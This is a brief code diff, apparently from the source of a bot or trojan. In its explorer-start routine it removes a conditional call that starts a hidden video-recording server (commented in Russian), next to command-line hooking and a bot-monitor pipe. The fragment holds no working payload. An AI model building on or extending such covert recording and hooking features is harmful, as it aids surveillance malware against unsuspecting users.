@@ -113,12 +113,6 @@ void ExplorerStart(PEventData Data)
 		HookCmdLine();
 	#endif
 
-    // Запускаем сервер видеозаписи
-	#ifdef VideoRecorderH 
-		VideoRecorderSrv::Start();
-	#endif
-
-
 	#ifdef BOTMONITOR
     	PIPE::CreateProcessPipe((PCHAR)BotMonitor::ProcessExplorer, true);
 	#endif
